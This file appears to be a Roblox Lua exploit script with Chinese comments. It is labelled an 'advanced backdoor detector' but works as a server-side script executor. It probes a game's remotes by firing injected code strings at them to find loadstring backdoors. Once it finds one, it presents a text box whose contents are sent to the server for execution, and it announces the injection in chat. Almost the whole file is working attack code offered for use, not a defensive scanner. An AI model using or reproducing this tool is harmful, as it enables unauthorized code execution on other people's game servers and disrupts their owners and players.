local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local MaterialService = game:GetService("MaterialService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local CollectionService = game:GetService("CollectionService")

-- 创建主GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = CoreGui
ScreenGui.Name = "AdvancedBackdoorDetector"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- 扫描按钮框架
local ScanFrame = Instance.new("Frame")
ScanFrame.Parent = ScreenGui
ScanFrame.BackgroundTransparency = 1
ScanFrame.Position = UDim2.new(0.05, 0, 0.85, -30)
ScanFrame.Size = UDim2.new(0, 120, 0, 60)
ScanFrame.Active = true
ScanFrame.Draggable = true

local ScanButton = Instance.new("TextButton")
ScanButton.Parent = ScanFrame
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScanButton.BorderColor3 = Color3.fromRGB(255, 0, 255)
ScanButton.BorderSizePixel = 3
ScanButton.Position = UDim2.new(0, 0, 0, 0)
ScanButton.Size = UDim2.new(1, 0, 1, 0)
ScanButton.Font = Enum.Font.SourceSansBold
ScanButton.Text = "🔍 扫描后门"
ScanButton.TextColor3 = Color3.fromRGB(255, 0, 255)
ScanButton.TextSize = 20

-- 执行器主框架
local ExecutorFrame = Instance.new("Frame")
ExecutorFrame.Parent = ScreenGui
ExecutorFrame.BackgroundTransparency = 0.1
ExecutorFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
ExecutorFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
ExecutorFrame.Size = UDim2.new(0, 600, 0, 500)
ExecutorFrame.Visible = false
ExecutorFrame.Active = true
ExecutorFrame.Draggable = true

-- 圆角
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = ExecutorFrame

-- 边框
local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(255, 0, 255)
UIStroke.Thickness = 2
UIStroke.Parent = ExecutorFrame

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Parent = ExecutorFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 10)
TitleCorner.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Parent = TitleBar
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 10, 0, 0)
TitleLabel.Size = UDim2.new(0.8, -10, 1, 0)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.Text = "🎯 高级后门检测器 v3.0 (22种检测方法)"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextSize = 20
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

local CloseButton = Instance.new("TextButton")
CloseButton.Parent = TitleBar
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseButton.Position = UDim2.new(1, -35, 0, 5)
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = "✕"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 20

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 5)
CloseCorner.Parent = CloseButton

CloseButton.MouseButton1Click:Connect(function()
    ExecutorFrame.Visible = false
    ScanFrame.Visible = true
end)

-- 状态标签
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Parent = ExecutorFrame
StatusLabel.BackgroundTransparency = 1
StatusLabel.Position = UDim2.new(0, 20, 0, 50)
StatusLabel.Size = UDim2.new(1, -40, 0, 25)
StatusLabel.Font = Enum.Font.SourceSans
StatusLabel.Text = "准备就绪 - 点击扫描按钮开始检测"
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
StatusLabel.TextSize = 18
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left

-- 进度条背景
local ProgressBg = Instance.new("Frame")
ProgressBg.Parent = ExecutorFrame
ProgressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
ProgressBg.Position = UDim2.new(0, 20, 0, 80)
ProgressBg.Size = UDim2.new(1, -40, 0, 20)

local ProgressCorner = Instance.new("UICorner")
ProgressCorner.CornerRadius = UDim.new(0, 10)
ProgressCorner.Parent = ProgressBg

local ProgressBar = Instance.new("Frame")
ProgressBar.Parent = ProgressBg
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
ProgressBar.Size = UDim2.new(0, 0, 1, 0)

local ProgressCorner2 = Instance.new("UICorner")
ProgressCorner2.CornerRadius = UDim.new(0, 10)
ProgressCorner2.Parent = ProgressBar

local ProgressText = Instance.new("TextLabel")
ProgressText.Parent = ProgressBg
ProgressText.BackgroundTransparency = 1
ProgressText.Size = UDim2.new(1, 0, 1, 0)
ProgressText.Font = Enum.Font.SourceSansBold
ProgressText.Text = "0%"
ProgressText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProgressText.TextSize = 14

-- 检测结果列表框架
local ListFrame = Instance.new("ScrollingFrame")
ListFrame.Parent = ExecutorFrame
ListFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
ListFrame.Position = UDim2.new(0, 20, 0, 110)
ListFrame.Size = UDim2.new(1, -40, 0, 200)
ListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ListFrame.ScrollBarThickness = 6

local ListCorner = Instance.new("UICorner")
ListCorner.CornerRadius = UDim.new(0, 8)
ListCorner.Parent = ListFrame

-- 命令输入框
local CommandTextBox = Instance.new("TextBox")
CommandTextBox.Parent = ExecutorFrame
CommandTextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
CommandTextBox.BorderColor3 = Color3.fromRGB(255, 0, 255)
CommandTextBox.BorderSizePixel = 2
CommandTextBox.Position = UDim2.new(0, 20, 0, 320)
CommandTextBox.Size = UDim2.new(1, -40, 0, 100)
CommandTextBox.Font = Enum.Font.Code
CommandTextBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
CommandTextBox.PlaceholderText = "-- 在这里输入要注入的脚本\nprint('Hello Backdoor!')\n\ngame:GetService('StarterGui'):SetCore('SendNotification', {\n    Title = '注入成功',\n    Text = '所有玩家可见!',\n    Duration = 5\n})"
CommandTextBox.Text = ""
CommandTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandTextBox.TextSize = 14
CommandTextBox.TextXAlignment = Enum.TextXAlignment.Left
CommandTextBox.TextYAlignment = Enum.TextYAlignment.Top
CommandTextBox.ClearTextOnFocus = false
CommandTextBox.MultiLine = true

local TextBoxCorner = Instance.new("UICorner")
TextBoxCorner.CornerRadius = UDim.new(0, 8)
TextBoxCorner.Parent = CommandTextBox

-- 执行按钮
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Parent = ExecutorFrame
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
ExecuteButton.Position = UDim2.new(0.05, 0, 1, -60)
ExecuteButton.Size = UDim2.new(0.42, 0, 0, 45)
ExecuteButton.Font = Enum.Font.GothamBold
ExecuteButton.Text = "⚡ 执行脚本"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.TextSize = 18

local ExecuteCorner = Instance.new("UICorner")
ExecuteCorner.CornerRadius = UDim.new(0, 8)
ExecuteCorner.Parent = ExecuteButton

-- 清空按钮
local ClearButton = Instance.new("TextButton")
ClearButton.Parent = ExecutorFrame
ClearButton.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
ClearButton.Position = UDim2.new(0.53, 0, 1, -60)
ClearButton.Size = UDim2.new(0.42, 0, 0, 45)
ClearButton.Font = Enum.Font.GothamBold
ClearButton.Text = "🗑️ 清空"
ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearButton.TextSize = 18

local ClearCorner = Instance.new("UICorner")
ClearCorner.CornerRadius = UDim.new(0, 8)
ClearCorner.Parent = ClearButton

-- 变量定义
local currentBackdoor = nil
local detectedBackdoors = {}
local scanning = false

-- 添加检测项到列表
local function addDetectionItem(name, status, color)
    local item = Instance.new("Frame")
    item.Size = UDim2.new(1, -10, 0, 30)
    item.Position = UDim2.new(0, 5, 0, (#ListFrame:GetChildren() - 1) * 35)
    item.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    item.Parent = ListFrame
    
    local itemCorner = Instance.new("UICorner")
    itemCorner.CornerRadius = UDim.new(0, 5)
    itemCorner.Parent = item
    
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(0.7, -5, 1, 0)
    nameLabel.Position = UDim2.new(0, 5, 0, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = name
    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.TextSize = 14
    nameLabel.Font = Enum.Font.Gotham
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.Parent = item
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.3, -5, 1, 0)
    statusLabel.Position = UDim2.new(0.7, 0, 0, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = status
    statusLabel.TextColor3 = color or Color3.fromRGB(255, 100, 100)
    statusLabel.TextSize = 14
    statusLabel.Font = Enum.Font.GothamBold
    statusLabel.Parent = item
    
    ListFrame.CanvasSize = UDim2.new(0, 0, 0, #ListFrame:GetChildren() * 35 + 10)
    
    return item
end

-- 清空检测列表
local function clearDetectionList()
    for _, v in pairs(ListFrame:GetChildren()) do
        if v:IsA("Frame") then
            v:Destroy()
        end
    end
    ListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
end

-- 等待重生函数
local function respawnWait()
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum then hum.Died:Wait() end
    end
    LocalPlayer.CharacterAdded:Wait()
    wait(1)
end

-- 测试远程对象
local function testRemote(remote, methodIndex)
    -- 生成随机测试代码
    local testNames = {
        "test" .. math.random(1000, 9999),
        "backdoor" .. math.random(1000, 9999),
        "check" .. math.random(1000, 9999),
        "verify" .. math.random(1000, 9999)
    }
    local testName = testNames[math.random(#testNames)]
    
    -- 不同的测试方法
    local testCodes = {
        -- 方法1: 创建模型
        function()
            local code = string.format('workspace:FindFirstChild("%s"):Destroy()', testName)
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(code)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(code)
                end
            end)
        end,
        
        -- 方法2: 创建部件
        function()
            local code = string.format('Instance.new("Part", workspace).Name = "%s"', testName)
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(code)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(code)
                end
            end)
        end,
        
        -- 方法3: 发送消息
        function()
            local code = 'game:GetService("StarterGui"):SetCore("SendNotification", {Title="Test", Text="Backdoor Test", Duration=1})'
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(code)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(code)
                end
            end)
        end,
        
        -- 方法4: 打印消息
        function()
            local code = 'print("Backdoor test from " .. game.Players.LocalPlayer.Name)'
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(code)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(code)
                end
            end)
        end,
        
        -- 方法5: 创建Folder
        function()
            local code = string.format('Instance.new("Folder", workspace).Name = "%s"', testName)
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(code)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(code)
                end
            end)
        end
    }
    
    -- 选择测试方法
    local testFunc = testCodes[methodIndex or math.random(#testCodes)]
    
    -- 执行测试
    local success = pcall(function()
        testFunc()
    end)
    
    if success then
        -- 等待并检查结果
        local start = tick()
        while tick() - start < 2 do
            RunService.Heartbeat:Wait()
            
            -- 检查是否有新对象被创建
            if workspace:FindFirstChild(testName) then
                workspace[testName]:Destroy()
                return true
            end
        end
    end
    
    return false
end

-- ==================== 22种后门检测方法 ====================

local detectionMethods = {
    {
        name = "1. ReplicatedStorage RemoteEvent后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") and (v.Name:lower():match("backdoor") or v.Name:lower():match("admin") or v.Name:lower():match("execute") or v.Name:lower():match("loadstring")) then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "2. ReplicatedStorage RemoteFunction后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteFunction") and (v.Name:lower():match("backdoor") or v.Name:lower():match("admin") or v.Name:lower():match("invoke") or v.Name:lower():match("server")) then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "3. 隐藏ModuleScript后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("ModuleScript") and (v.Name:match("^_") or v.Name:match("^%.") or v.Name:match("^secret")) then
                    local success, source = pcall(function() return v.Source end)
                    if success and source and (source:lower():match("loadstring") or source:lower():match("backdoor") or source:lower():match("remote")) then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "4. ServerScriptService脚本后门",
        func = function()
            for _, v in pairs(ServerScriptService:GetDescendants()) do
                if v:IsA("Script") and (v.Name:lower():match("loader") or v.Name:lower():match("inject") or v.Name:lower():match("backdoor")) then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "5. Workspace隐藏脚本后门",
        func = function()
            for _, v in pairs(Workspace:GetDescendants()) do
                if v:IsA("Script") and v.ClassName == "Script" and v.Name:match("^_") then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "6. StarterGui LocalScript后门",
        func = function()
            for _, v in pairs(game:GetService("StarterGui"):GetDescendants()) do
                if v:IsA("LocalScript") and (v.Name:lower():match("backdoor") or v.Name:match("^_")) then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "7. Lighting脚本后门",
        func = function()
            for _, v in pairs(Lighting:GetDescendants()) do
                if v:IsA("Script") and v.Name:lower():match("light") == nil then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "8. 第三方服务后门",
        func = function()
            local services = {MaterialService, TeleportService, MarketplaceService}
            for _, service in pairs(services) do
                for _, v in pairs(service:GetDescendants()) do
                    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "9. CoreGui注入后门",
        func = function()
            for _, v in pairs(CoreGui:GetDescendants()) do
                if v:IsA("Script") and v.Parent ~= ScreenGui then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "10. 可疑的Remote命名后门",
        func = function()
            local suspiciousNames = {"admin", "mod", "owner", "god", "sudo", "root", "bypass", "exploit", "hack", "cheat"}
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    for _, name in pairs(suspiciousNames) do
                        if v.Name:lower():match(name) then
                            table.insert(detectedBackdoors, v)
                            return true
                        end
                    end
                end
            end
            return false
        end
    },
    {
        name = "11. HTTP请求后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("ModuleScript") then
                    local success, source = pcall(function() return v.Source end)
                    if success and source and (source:lower():match("http") or source:lower():match("request") or source:lower():match("fetch")) then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "12. Teleport后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") and v.Name:lower():match("teleport") then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "13. Loadstring执行后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("ModuleScript") then
                    local success, source = pcall(function() return v.Source end)
                    if success and source and source:lower():match("loadstring") then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "14. 数字命名后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    if tonumber(v.Name) then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "15. 随机命名后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    if #v.Name > 20 then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "16. CollectionService标记后门",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if CollectionService:HasTag(v, "Backdoor") or CollectionService:HasTag(v, "Admin") then
                    table.insert(detectedBackdoors, v)
                    return true
                end
            end
            return false
        end
    },
    {
        name = "17. 属性后门检测",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    if v:GetAttribute("Backdoor") or v:GetAttribute("Admin") then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "18. 父级检测后门",
        func = function()
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    if v.Parent and v.Parent.Name:lower():match("backdoor") then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "19. 动态执行测试",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    local success = testRemote(v, 1)
                    if success then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "20. 对象创建测试",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    local success = testRemote(v, 2)
                    if success then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "21. 通知发送测试",
        func = function()
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    local success = testRemote(v, 3)
                    if success then
                        table.insert(detectedBackdoors, v)
                        return true
                    end
                end
            end
            return false
        end
    },
    {
        name = "22. 综合行为分析",
        func = function()
            local testCount = 0
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    for i = 1, 3 do
                        local success = testRemote(v, i)
                        if success then
                            testCount = testCount + 1
                        end
                        if testCount >= 2 then
                            table.insert(detectedBackdoors, v)
                            return true
                        end
                    end
                end
            end
            return false
        end
    }
}

-- 扫描后门函数
local function scanBackdoors()
    if scanning then return end
    scanning = true
    
    ScanButton.Text = "扫描中..."
    ScanButton.Active = false
    StatusLabel.Text = "正在扫描后门 (22种检测方法)..."
    
    -- 清空之前的结果
    clearDetectionList()
    detectedBackdoors = {}
    
    local totalMethods = #detectionMethods
    local foundCount = 0
    
    -- 执行所有检测方法
    for i, method in ipairs(detectionMethods) do
        -- 更新进度条
        local progress = (i / totalMethods) * 100
        ProgressBar.Size = UDim2.new(progress / 100, 0, 1, 0)
        ProgressText.Text = math.floor(progress) .. "%"
        StatusLabel.Text = "执行检测: " .. method.name
        
        -- 执行检测
        local hasBackdoor = false
        local success = pcall(function()
            hasBackdoor = method.func()
        end)
        
        if success and hasBackdoor then
            foundCount = foundCount + 1
            addDetectionItem(method.name, "⚠️ 发现", Color3.fromRGB(255, 150, 0))
        else
            addDetectionItem(method.name, "✅ 安全", Color3.fromRGB(100, 255, 100))
        end
        
        wait(0.1) -- 短暂延迟，让界面更新
    end
    
    -- 扫描完成
    ProgressBar.Size = UDim2.new(1, 0, 1, 0)
    ProgressText.Text = "100%"
    
    ScanButton.Text = "扫描"
    ScanButton.Active = true
    
    if foundCount > 0 then
        StatusLabel.Text = string.format("✅ 检测完成！发现 %d 个后门", foundCount)
        
        -- 展开执行器界面
        local expand = TweenService:Create(ScanFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 600, 0, 500),
            Position = UDim2.new(0.3, 0, 0.2, 0)
        })
        expand:Play()
        
        expand.Completed:Connect(function()
            ScanFrame.Visible = false
            ExecutorFrame.Visible = true
            ExecutorFrame.Position = ScanFrame.Position
        end)
        
        -- 选择第一个后门作为当前后门
        currentBackdoor = detectedBackdoors[1]
        
        StarterGui:SetCore("SendNotification", {
            Title = "✅ 后门发现",
            Text = string.format("找到 %d 个后门！", foundCount),
            Duration = 5
        })
    else
        StatusLabel.Text = "❌ 未检测到任何后门"
        ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        
        StarterGui:SetCore("SendNotification", {
            Title = "❌ 扫描结果",
            Text = "未检测到后门",
            Duration = 3
        })
        
        -- 3秒后恢复
        wait(3)
        ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
        ProgressBar.Size = UDim2.new(0, 0, 1, 0)
        ProgressText.Text = "0%"
        StatusLabel.Text = "准备就绪 - 点击扫描按钮开始检测"
    end
    
    scanning = false
end

-- 执行脚本函数
local function executeCommand()
    if not currentBackdoor and #detectedBackdoors == 0 then
        StarterGui:SetCore("SendNotification", {
            Title = "错误",
            Text = "没有找到后门",
            Duration = 3
        })
        return
    end
    
    -- 如果没有选择后门，使用第一个
    if not currentBackdoor then
        currentBackdoor = detectedBackdoors[1]
    end
    
    local cmd = CommandTextBox.Text
    if cmd == "" then 
        StarterGui:SetCore("SendNotification", {
            Title = "错误",
            Text = "请输入要执行的脚本",
            Duration = 3
        })
        return
    end
    
    -- 执行脚本
    local success, result = pcall(function()
        if currentBackdoor:IsA("RemoteEvent") then
            currentBackdoor:FireServer(cmd)
        elseif currentBackdoor:IsA("RemoteFunction") then
            return currentBackdoor:InvokeServer(cmd)
        elseif currentBackdoor:IsA("ModuleScript") then
            local module = require(currentBackdoor)
            if type(module) == "function" then
                return module(cmd)
            end
        elseif currentBackdoor:IsA("Script") then
            -- 对于普通脚本，我们无法直接执行，但可以尝试其他方法
        end
    end)
    
    if success then
        -- 尝试显示执行结果
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "✅ 执行成功",
                Text = "脚本已注入！",
                Duration = 3
            })
        end)
        
        -- 尝试在聊天中显示
        pcall(function()
            local chatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if chatService then
                local sayRequest = chatService:FindFirstChild("SayMessageRequest")
                if sayRequest then
                    sayRequest:FireServer("🔔 后门脚本已执行！", "All")
                end
            end
        end)
    else
        StarterGui:SetCore("SendNotification", {
            Title = "❌ 执行失败",
            Text = tostring(result),
            Duration = 4
        })
    end
end

-- 清空文本框
local function clearText()
    CommandTextBox.Text = ""
    ExecuteButton.Text = "⚡ 执行脚本"
    wait(0.2)
    ExecuteButton.Text = "⚡ 执行脚本"
end

-- 绑定事件
ScanButton.MouseButton1Click:Connect(scanBackdoors)
ExecuteButton.MouseButton1Click:Connect(executeCommand)
ClearButton.MouseButton1Click:Connect(clearText)

CommandTextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        executeCommand()
    end
end)

-- 添加热键（Alt键显示/隐藏）
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
        if ExecutorFrame.Visible then
            ExecutorFrame.Visible = false
            ScanFrame.Visible = true
        elseif not ScanFrame.Visible then
            ScanFrame.Visible = true
        else
            ScanFrame.Visible = false
            ExecutorFrame.Visible = false
        end
    end
end)

-- 初始化显示
print("✅ 高级后门检测器已加载 (22种检测方法)")
print("按 Alt 键显示/隐藏界面")
